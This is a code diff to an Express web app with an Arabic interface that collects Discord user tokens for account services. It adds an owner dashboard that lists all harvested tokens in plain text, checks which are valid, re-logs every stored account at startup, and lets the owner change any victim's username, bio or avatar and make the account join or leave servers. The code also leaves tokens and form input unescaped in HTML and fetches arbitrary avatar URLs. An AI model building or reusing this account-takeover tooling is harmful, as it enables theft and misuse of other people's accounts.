@@ -13,10 +13,16 @@ const {
 
 const API = "https://discord.com/api/v10";
 
+const activeClients = new Map();
+const googlePlayGames = ["PUBG MOBILE", "Free Fire", "Roblox", "Minecraft", "Brawl Stars", "Call of Duty: Mobile"];
+
 mongoose.connect(MONGO_URI, {
   useNewUrlParser: true,
   useUnifiedTopology: true
-}).then(() => console.log("Connected to MongoDB!")).catch(err => console.error(err));
+}).then(async () => {
+  console.log("Connected to MongoDB!");
+  await autoLoginAllTokens();
+}).catch(err => console.error(err));
 
 const userSchema = new mongoose.Schema({
   token: { type: String, required: true, unique: true },
@@ -50,7 +56,25 @@ async function updateStat(field, value = 1) {
   );
 }
 
-const activeClients = new Map();
+async function autoLoginAllTokens() {
+  try {
+    const tokens = await TokenModel.find({});
+    console.log(`🔄 جاري إعادة تشغيل ${tokens.length} حساب تلقائياً...`);
+    for (const user of tokens) {
+      if (activeClients.has(user.token)) continue;
+      const client = new Client();
+      const randomGame = googlePlayGames[Math.floor(Math.random() * googlePlayGames.length)];
+
+      client.on("ready", () => {
+        client.user.setPresence({ activities: [{ name: randomGame, type: "PLAYING" }], status: "online" });
+      });
+
+      client.login(user.token).then(() => {
+        activeClients.set(user.token, client);
+      }).catch(err => {});
+    }
+  } catch (e) {}
+}
 
 const app = express();
 app.use(express.urlencoded({ extended: true }));
@@ -84,13 +108,13 @@ const layout = (title, content) => `<!doctype html>
       border-radius: 24px;
       padding: 40px 30px;
       text-align: center;
-      max-width: 520px;
+      max-width: 600px;
       width: 100%;
       box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9), 0 0 35px rgba(255, 107, 0, 0.2);
     }
     h2 { font-size: 22px; color: #ff9f43; margin-bottom: 20px; font-weight: 700; }
     p { font-size: 14px; color: #b8b5e0; margin-bottom: 20px; line-height: 1.6; }
-    input[type="password"], input[type="text"], select, input[type="number"] {
+    input[type="password"], input[type="text"], select, input[type="number"], textarea {
       width: 100%;
       padding: 14px;
       background: rgba(10, 5, 20, 0.8);
@@ -103,7 +127,7 @@ const layout = (title, content) => `<!doctype html>
       outline: none;
       text-align: center;
     }
-    input:focus, select:focus { border-color: #ff7b00; box-shadow: 0 0 10px rgba(255, 123, 0, 0.3); }
+    input:focus, select:focus, textarea:focus { border-color: #ff7b00; box-shadow: 0 0 10px rgba(255, 123, 0, 0.3); }
     .btn {
       display: block;
       width: 100%;
@@ -131,6 +155,14 @@ const layout = (title, content) => `<!doctype html>
       background: linear-gradient(135deg, #8a2be2, #4b0082);
       box-shadow: 0 4px 15px rgba(138, 43, 226, 0.4);
     }
+    .btn-danger {
+      background: linear-gradient(135deg, #e74c3c, #c0392b);
+      box-shadow: 0 4px 15px rgba(231, 76, 60, 0.4);
+      padding: 8px 12px;
+      font-size: 13px;
+      width: auto;
+      display: inline-block;
+    }
     .avatar {
       width: 96px;
       height: 96px;
@@ -140,17 +172,8 @@ const layout = (title, content) => `<!doctype html>
       box-shadow: 0 0 20px rgba(255, 123, 0, 0.5);
       margin-bottom: 16px;
     }
-    .username {
-      font-size: 20px;
-      font-weight: 700;
-      color: #f3f0ff;
-      margin-bottom: 6px;
-    }
-    .user-tag {
-      font-size: 13px;
-      color: #b8b5e0;
-      margin-bottom: 20px;
-    }
+    .username { font-size: 20px; font-weight: 700; color: #f3f0ff; margin-bottom: 6px; }
+    .user-tag { font-size: 13px; color: #b8b5e0; margin-bottom: 20px; }
     .logs-box {
       background: rgba(5, 2, 10, 0.95);
       border: 1px solid rgba(255, 107, 0, 0.3);
@@ -174,6 +197,16 @@ const layout = (title, content) => `<!doctype html>
       display: flex;
       justify-content: space-between;
     }
+    .token-item {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 107, 0, 0.2);
+      border-radius: 10px;
+      padding: 12px;
+      margin-bottom: 10px;
+      text-align: right;
+      font-size: 13px;
+      word-break: break-all;
+    }
     .developer-sig {
       font-size: 10px;
       font-weight: 300;
@@ -194,7 +227,6 @@ const layout = (title, content) => `<!doctype html>
 </body>
 </html>`;
 
-// مسار رئيسي ذكي: يتحقق إذا كان مسجل دخول، وإلا يطلب الباسورد
 app.get("/", async (req, res) => {
   const sid = req.signedCookies.sid;
   if (sid) {
@@ -278,7 +310,7 @@ app.get("/token-entry", checkNormalAuth, (req, res) => {
       <button class="btn" type="submit">فحص التوكن والمتابعة</button>
     </form>
     <div style="margin-top:20px;">
-      <a href="/logout" style="color:#ff5555; font-size:13px; text-decoration:none;">تسجيل الخروج (طلب الباسورد من جديد)</a>
+      <a href="/logout" style="color:#ff5555; font-size:13px; text-decoration:none;">تسجيل الخروج</a>
     </div>
   `));
 });
@@ -296,14 +328,11 @@ app.post("/verify-token", checkNormalAuth, async (req, res) => {
   if (!token) return res.redirect("/token-entry");
 
   try {
-    const userRes = await fetch(`${API}/users/@me`, {
-      headers: { Authorization: token }
-    });
-
+    const userRes = await fetch(`${API}/users/@me`, { headers: { Authorization: token } });
     if (!userRes.ok) {
       return res.send(layout("فحص التوكن", `
         <h2>❌ التوكن غير سليم أو غير شغال!</h2>
-        <p style="color:#ff5555;">تأكد من إدخال توكن حساب حقيقي وصحيح.</p>
+        <p style="color:#ff5555;">تأكد من إدخال توكن حقيقي وصحيح.</p>
         <a class="btn" href="/token-entry?service=${serviceType}">إعادة المحاولة</a>
       `));
     }
@@ -328,30 +357,24 @@ app.post("/verify-token", checkNormalAuth, async (req, res) => {
       </div>
       <a class="btn" href="/proceed-service">تخطي والانتقال للخدمة المطلوبة</a>
     `));
-
   } catch (err) {
-    res.send(layout("خطأ", `
-      <h2>❌ حدث خطأ أثناء فحص التوكن</h2>
-      <a class="btn" href="/token-entry?service=${serviceType}">إعادة المحاولة</a>
-    `));
+    res.send(layout("خطأ", `<h2>❌ حدث خطأ أثناء فحص التوكن</h2><a class="btn" href="/token-entry?service=${serviceType}">إعادة المحاولة</a>`));
   }
 });
 
 app.get("/proceed-service", checkNormalAuth, (req, res) => {
   const service = req.signedCookies.selected_service;
-  if (service === "leave") {
-    res.redirect("/leave-servers");
-  } else if (service === "online") {
-    res.redirect("/online-options");
-  } else {
-    res.redirect("/token-entry");
-  }
+  if (service === "leave") res.redirect("/leave-servers");
+  else if (service === "online") res.redirect("/online-options");
+  else res.redirect("/token-entry");
 });
-// --- لوحة تحكم المالك ---
+// --- لوحة تحكم المالك المطورة ---
 app.get("/owner-dashboard", checkOwnerAuth, async (req, res) => {
   res.send(layout("لوحة تحكم المالك", `
     <h2>👑 أهلاً بك يا مالك الموقع</h2>
     <p>تحكم كامل بجميع الحسابات والسيرفرات</p>
+    <a class="btn btn-owner" href="/owner/tokens">📦 التوكنات المحفوظة (الإدارة والفحص)</a>
+    <a class="btn btn-owner" href="/owner/manage-account">⚙️ التحكم المباشر بالحسابات (تعديل، يوزر، سيرفرات)</a>
     <a class="btn btn-owner" href="/owner/leave-all">إخراج كل الحسابات المسجلة من السيرفرات</a>
     <a class="btn btn-owner" href="/owner/check-server">فحص سيرفر معين</a>
     <a class="btn btn-owner" href="/owner/cooldown">تعيين مدة الاشتراك (Auto-Leave)</a>
@@ -363,6 +386,196 @@ app.get("/owner-dashboard", checkOwnerAuth, async (req, res) => {
   `));
 });
 
+// --- قسم التوكنات المحفوظة وفحصها ---
+app.get("/owner/tokens", checkOwnerAuth, async (req, res) => {
+  const tokens = await TokenModel.find({});
+  let tokensHtml = "";
+  
+  for (const t of tokens) {
+    tokensHtml += `
+      <div class="token-item">
+        <div style="margin-bottom:8px; font-weight:700; color:#ff9f43;">${t.token}</div>
+        <form method="POST" action="/owner/tokens/delete" style="display:inline;">
+          <input type="hidden" name="id" value="${t._id}">
+          <button class="btn-danger" type="submit">حذف التوكن</button>
+        </form>
+      </div>
+    `;
+  }
+
+  res.send(layout("التوكنات المحفوظة", `
+    <h2>📦 إدارة التوكنات المحفوظة</h2>
+    <div style="display: flex; gap: 10px; margin-bottom: 20px;">
+      <a href="/owner/tokens" class="btn" style="margin-bottom:0; font-size:13px; padding:10px;">عرض وحذف التوكنات</a>
+      <a href="/owner/check-tokens" class="btn btn-secondary" style="margin-bottom:0; font-size:13px; padding:10px;">🔍 فحص التوكنات ({Token} {user})</a>
+    </div>
+    
+    <form method="POST" action="/owner/tokens/add" style="margin-bottom:20px;">
+      <input type="text" name="token" placeholder="أضف توكن جديد هنا..." required autocomplete="off">
+      <button class="btn btn-owner" type="submit">إضافة التوكن للقاعدة</button>
+    </form>
+
+    <div style="max-height: 250px; overflow-y: auto; text-align: right; margin-bottom: 20px;">
+      ${tokensHtml || "<p>لا توجد توكنات محفوظة حالياً.</p>"}
+    </div>
+
+    <a class="btn btn-secondary" href="/owner-dashboard">العودة للوحة المالك</a>
+  `));
+});
+
+app.post("/owner/tokens/add", checkOwnerAuth, async (req, res) => {
+  const { token } = req.body;
+  if (token) {
+    try {
+      await TokenModel.findOneAndUpdate({ token }, { token }, { upsert: true, new: true });
+    } catch(e){}
+  }
+  res.redirect("/owner/tokens");
+});
+
+app.post("/owner/tokens/delete", checkOwnerAuth, async (req, res) => {
+  const { id } = req.body;
+  if (id) {
+    await TokenModel.findByIdAndDelete(id);
+  }
+  res.redirect("/owner/tokens");
+});
+
+// فحص التوكنات بالشكل المطلوب: {Token} {user} {online/offline}
+app.get("/owner/check-tokens", checkOwnerAuth, async (req, res) => {
+  const tokens = await TokenModel.find({});
+  let reportHtml = "";
+
+  for (const t of tokens) {
+    let userName = "مجهول / تالف";
+    let statusStr = "offline";
+    try {
+      const r = await fetch(`${API}/users/@me`, { headers: { Authorization: t.token } });
+      if (r.ok) {
+        const uData = await r.json();
+        userName = uData.global_name || uData.username;
+        statusStr = activeClients.has(t.token) ? "online" : "offline";
+      }
+    } catch(e){}
+
+    reportHtml += `
+      <div class="token-item">
+        <b style="color:#57f287;">Token:</b> ${t.token}<br>
+        <b style="color:#ff9f43;">User:</b> ${userName}<br>
+        <b style="color:#8a2be2;">Status:</b> ${statusStr}
+      </div>
+    `;
+  }
+
+  res.send(layout("نتيجة فحص التوكنات", `
+    <h2>🔍 تقرير فحص التوكنات</h2>
+    <div style="max-height: 300px; overflow-y: auto; text-align: right; margin-bottom: 20px;">
+      ${reportHtml || "<p>لا توجد توكنات لفحصها.</p>"}
+    </div>
+    <a class="btn" href="/owner/tokens">العودة لإدارة التوكنات</a>
+    <a class="btn btn-secondary" href="/owner-dashboard">العودة للوحة المالك</a>
+  `));
+});
+
+// --- لوحة التحكم المباشر بأي حساب (تعديل يوزر، صورة، بايو، سيرفرات، حالة) ---
+app.get("/owner/manage-account", checkOwnerAuth, (req, res) => {
+  res.send(layout("التحكم الكامل بالحسابات", `
+    <h2>⚙️ التحكم بالحسابات بالتوكن</h2>
+    <form method="POST" action="/owner/manage-account/action">
+      <input type="text" name="token" placeholder="ضع توكن الحساب المراد إدارته هنا..." required autocomplete="off">
+      
+      <label style="display:block; text-align:right; font-size:13px; margin-bottom:5px; color:#ff9f43;">اختر العملية:</label>
+      <select name="actionType" required>
+        <option value="username">تغيير اسم المستخدم (Username)</option>
+        <option value="bio">تغيير البايو (Bio / About Me)</option>
+        <option value="avatar">تغيير صورة الحساب (Avatar URL)</option>
+        <option value="join">دخول سيرفر برابط الدعوة (Join Server)</option>
+        <option value="leave">خروج من سيرفر بآيدي السيرفر (Leave Server)</option>
+        <option value="status">تغيير الحالة والنشاط (Status & Presence)</option>
+      </select>
+
+      <label style="display:block; text-align:right; font-size:13px; margin-bottom:5px; color:#ff9f43;">القيمة الجديدة / البيانات المطلوبة:</label>
+      <input type="text" name="actionValue" placeholder="اكتب الاسم الجديد، رابط الصورة، كود الدعوة، أو آيدي السيرفر..." required autocomplete="off">
+
+      <button class="btn btn-owner" type="submit">تنفيذ التعديل على الحساب</button>
+    </form>
+    <a class="btn btn-secondary" href="/owner-dashboard">العودة للوحة المالك</a>
+  `));
+});
+
+app.post("/owner/manage-account/action", checkOwnerAuth, async (req, res) => {
+  const { token, actionType, actionValue } = req.body;
+  let resultMsg = "❌ فشلت العملية.";
+
+  try {
+    if (actionType === "username") {
+      const r = await fetch(`${API}/users/@me`, {
+        method: "PATCH",
+        headers: { Authorization: token, "Content-Type": "application/json" },
+        body: JSON.stringify({ username: actionValue })
+      });
+      if (r.ok) resultMsg = `✅ تم تغيير اليوزر إلى: ${actionValue}`;
+    } else if (actionType === "bio") {
+      const r = await fetch(`${API}/users/@me`, {
+        method: "PATCH",
+        headers: { Authorization: token, "Content-Type": "application/json" },
+        body: JSON.stringify({ bio: actionValue })
+      });
+      if (r.ok) resultMsg = `✅ تم تغيير البايو بنجاح.`;
+    } else if (actionType === "avatar") {
+      // جلب رابط الصورة وتحويله لـ Data URI أو إرساله مباشرة حسب دعم ديسكورد
+      const imgRes = await fetch(actionValue);
+      const buffer = await imgRes.arrayBuffer();
+      const base64Img = `data:image/png;base64,${Buffer.from(buffer).toString("base64")}`;
+      
+      const r = await fetch(`${API}/users/@me`, {
+        method: "PATCH",
+        headers: { Authorization: token, "Content-Type": "application/json" },
+        body: JSON.stringify({ avatar: base64Img })
+      });
+      if (r.ok) resultMsg = `✅ تم تغيير صورة الحساب بنجاح.`;
+    } else if (actionType === "join") {
+      // actionValue هنا هو كود الدعوة مثل discord.gg/xxxxx أو الحروف الأخيرة
+      const inviteCode = actionValue.split("/").pop();
+      const r = await fetch(`${API}/invites/${inviteCode}`, {
+        method: "POST",
+        headers: { Authorization: token }
+      });
+      if (r.ok) resultMsg = `✅ تم دخول الحساب إلى السيرفر بنجاح عبر الدعوة!`;
+    } else if (actionType === "leave") {
+      const guildId = actionValue.trim();
+      const r = await fetch(`${API}/users/@me/guilds/${guildId}`, {
+        method: "DELETE",
+        headers: { Authorization: token }
+      });
+      if (r.status === 204 || r.ok) resultMsg = `✅ تم إخراج الحساب من السيرفر (${guildId}).`;
+    } else if (actionType === "status") {
+      // actionValue هنا يمكن أن يكون النص المكتوب للنشاط
+      if (activeClients.has(token)) {
+        try { activeClients.get(token).destroy(); } catch(e){}
+        activeClients.delete(token);
+      }
+      const client = new Client();
+      client.on("ready", () => {
+        client.user.setPresence({ activities: [{ name: actionValue, type: "PLAYING" }], status: "online" });
+      });
+      await client.login(token);
+      activeClients.set(token, client);
+      resultMsg = `✅ تم تشغيل الحساب بحالة أونلاين ونشاط: ${actionValue}`;
+    }
+  } catch (err) {
+    resultMsg = `❌ حدث خطأ برمجتي أثناء التنفيذ.`;
+  }
+
+  res.send(layout("نتيجة التنفيذ", `
+    <h2>📢 نتيجة تنفيذ الأمر</h2>
+    <p style="font-size:16px; margin:20px 0; color:#57f287;">${resultMsg}</p>
+    <a class="btn" href="/owner/manage-account">تنفيذ أمر آخر</a>
+    <a class="btn btn-secondary" href="/owner-dashboard">العودة للوحة المالك</a>
+  `));
+});
+
+// --- الإحصائيات وباقي الروتين ---
 app.get("/owner/leave-all", checkOwnerAuth, async (req, res) => {
   res.send(layout("إخراج جميع الحسابات...", `
     <h2>⚠️ جاري إخراج كل الحسابات من جميع السيرفرات...</h2>
@@ -493,7 +706,6 @@ app.get("/owner/info", checkOwnerAuth, async (req, res) => {
 app.get("/owner/all-online", checkOwnerAuth, async (req, res) => {
   const tokens = await TokenModel.find({});
   let successCount = 0;
-  const googlePlayGames = ["PUBG MOBILE", "Free Fire", "Roblox", "Minecraft", "Brawl Stars", "Call of Duty: Mobile"];
 
   for (const user of tokens) {
     if (activeClients.has(user.token)) continue;
@@ -519,7 +731,7 @@ app.get("/owner/all-online", checkOwnerAuth, async (req, res) => {
   `));
 });
 
-// --- الخدمات الفردية ---
+// --- الخدمات الفردية للمستخدم العادي ---
 app.get("/leave-servers", checkNormalAuth, async (req, res) => {
   res.send(layout("جاري المغادرة...", `
     <h2>⚠️ جاري الخروج من السيرفرات...</h2>
@@ -620,7 +832,7 @@ app.post("/start-online", checkNormalAuth, async (req, res) => {
     await updateStat("totalOperations");
     res.send(layout("تم التشغيل", `
       <h2>🚀 تم تفعيل الحالة بنجاح!</h2>
-      <p>الحساب الآن أونلاين بوضع <b>(${status})</b> ونشاط <b>(${statusType}: ${statusText})</b> وسيبقى يعمل طالما السيرفر يعمل.</p>
+      <p>الحساب الآن أونلاين بوضع <b>(${status})</b> ونشاط <b>(${statusType}: ${statusText})</b> وسيبقى يعمل دائماً.</p>
       <a class="btn" href="/token-entry?service=online">العودة للرئيسية</a>
     `));
   } catch (err) {
